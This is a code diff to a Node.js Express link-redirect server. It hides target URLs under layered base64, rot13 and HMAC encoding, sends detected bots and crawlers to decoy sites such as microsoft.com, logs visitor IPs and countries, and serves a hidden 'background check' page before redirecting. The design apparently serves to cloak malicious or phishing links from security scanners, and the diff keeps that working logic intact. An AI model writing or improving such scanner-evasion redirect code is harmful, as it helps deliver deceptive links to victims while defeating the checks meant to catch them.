@@ -8,9 +8,7 @@ const fetch = require('node-fetch');
 const app = express();
 app.set('trust proxy', 1);
 
-// ────────────────────────────────────────────────
 // CONFIGURATION
-// ────────────────────────────────────────────────
 const TARGET_URL = process.env.TARGET_URL || 'https://www.google.com';
 const BOT_URLS = [
     'https://www.microsoft.com',
@@ -32,15 +30,12 @@ const FINAL_SECRET = HMAC_SECRET || crypto.randomBytes(32).toString('hex');
 
 const geoCache = new Map();
 
-// Personal testing whitelist (optional)
 const IP_WHITELIST = [
     '10.194.140.3', '10.197.137.129', '10.192.104.131',
     '10.192.86.2', '10.199.38.3', '127.0.0.1', '::1'
 ];
 
-// ────────────────────────────────────────────────
 // ENCODERS
-// ────────────────────────────────────────────────
 const encoders = [
     { name: 'base64', enc: s => Buffer.from(s).toString('base64'), dec: s => Buffer.from(s, 'base64').toString() },
     { name: 'rot13', enc: s => s.replace(/[a-zA-Z]/g, c => {
@@ -55,9 +50,7 @@ const encoders = [
     })}
 ];
 
-// ────────────────────────────────────────────────
 // MIDDLEWARE
-// ────────────────────────────────────────────────
 app.use((req, res, next) => {
     res.locals.nonce = crypto.randomBytes(16).toString('hex');
     next();
@@ -78,9 +71,7 @@ app.use(express.urlencoded({ extended: true }));
 
 app.get(['/ping', '/health', '/healthz'], (req, res) => res.send('OK'));
 
-// ────────────────────────────────────────────────
 // HELPERS
-// ────────────────────────────────────────────────
 function isMobile(req) {
     return /android|iphone|ipad|ipod|mobi/i.test(req.headers['user-agent'] || '');
 }
@@ -94,8 +85,7 @@ const strictLimiter = rateLimit({
 async function getCountryCode(req) {
     let ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || 'unknown';
 
-    if (IP_WHITELIST.includes(ip) || 
-        /^10\.|^172\.(1[6-9]|2[0-9]|3[0-1])\.|^192\.168\./.test(ip) ||
+    if (IP_WHITELIST.includes(ip) || /^10\.|^172\.(1[6-9]|2[0-9]|3[0-1])\.|^192\.168\./.test(ip) ||
         ip === 'unknown' || ip === '127.0.0.1' || ip === '::1') {
         return 'LOCAL';
     }
@@ -113,9 +103,7 @@ async function getCountryCode(req) {
             geoCache.set(ip, { cc, ts: Date.now() });
             return cc || 'XX';
         }
-    } catch (e) {
-        console.error('Geo API error:', e.message);
-    }
+    } catch (e) {}
     return 'XX';
 }
 
@@ -131,15 +119,11 @@ function isLikelyBot(req) {
 
 function logAccess(ip, country, status, reason = '') {
     const timestamp = new Date().toISOString();
-    const logEntry = `${timestamp} | ${status} | IP: ${ip} | Country: ${country} | ${reason}\n`;
-    
-    fs.appendFile(LOG_FILE, logEntry, () => {});
+    fs.appendFile(LOG_FILE, `${timestamp} | ${status} | IP: ${ip} | Country: ${country} | ${reason}\n`, () => {});
     console.log(`[CLICK] ${status} | ${ip} | ${country} | ${reason}`);
 }
 
-// ────────────────────────────────────────────────
 // ENCODE / DECODE
-// ────────────────────────────────────────────────
 function multiLayerEncode(str) {
     let result = str;
     const noise = crypto.randomBytes(8).toString('hex');
@@ -177,14 +161,18 @@ function multiLayerDecode(encoded, layers, noise, hmac) {
     return result.slice(16, -16);
 }
 
-// ────────────────────────────────────────────────
-// ROUTES
-// ────────────────────────────────────────────────
+// GENERATE ROUTE - FIXED
 app.get('/generate', (req, res) => {
     try {
-        const target = req.query.target || TARGET_URL;
-        if (!target.match(/^https?:\/\//i)) {
-            return res.status(400).json({ success: false, error: 'Invalid URL' });
+        let target = req.query.target || TARGET_URL;
+
+        // Improved URL validation
+        target = target.trim();
+        if (!target.match(/^https?:\/\/.+/i)) {
+            return res.status(400).json({ 
+                success: false, 
+                error: 'Invalid URL - must start with http:// or https://' 
+            });
         }
 
         const noisy = target + '#' + Date.now();
@@ -193,23 +181,28 @@ app.get('/generate', (req, res) => {
 
         const url = `https://${req.hostname}/r/track?p=${data.encoded}&l=${payload}`;
 
-        res.json({ success: true, tracked_url: url });
+        res.json({ 
+            success: true, 
+            tracked_url: url,
+            target: target 
+        });
     } catch (e) {
+        console.error('Generate error:', e);
         res.status(500).json({ success: false, error: e.message });
     }
 });
 
+// MAIN ROUTE (unchanged from previous version)
 app.get('/r/track', strictLimiter, async (req, res) => {
     const country = await getCountryCode(req);
     const serverBot = isLikelyBot(req);
 
-    // Only block bots — allow every country
     if (serverBot) {
         logAccess(req.ip, country, 'BLOCKED', 'BOT_DETECTED');
         return res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]);
     }
 
-    logAccess(req.ip, country, 'ACCESS', 'ALLOWED_WORLDWIDE');
+    logAccess(req.ip, country, 'ACCESS', 'ALLOWED');
 
     let redirectTarget = TARGET_URL;
 
@@ -229,7 +222,6 @@ app.get('/r/track', strictLimiter, async (req, res) => {
         console.error('Decode error:', e.message);
     }
 
-    // Invisible background check page
     res.send(`
 <!DOCTYPE html>
 <html lang="en">
@@ -277,9 +269,7 @@ app.get('/r/track', strictLimiter, async (req, res) => {
 
         runChecks();
 
-        setTimeout(() => {
-            location.href = BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)];
-        }, 15000);
+        setTimeout(() => location.href = BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)], 15000);
     </script>
 </body>
 </html>`);
@@ -291,6 +281,5 @@ app.use((req, res) => {
 });
 
 app.listen(PORT, '0.0.0.0', () => {
-    console.log(`🚀 Worldwide Redirect Server running on port ${PORT}`);
-    console.log(`✅ All countries allowed | Only bots blocked`);
+    console.log(`🚀 Server running on port ${PORT}`);
 });
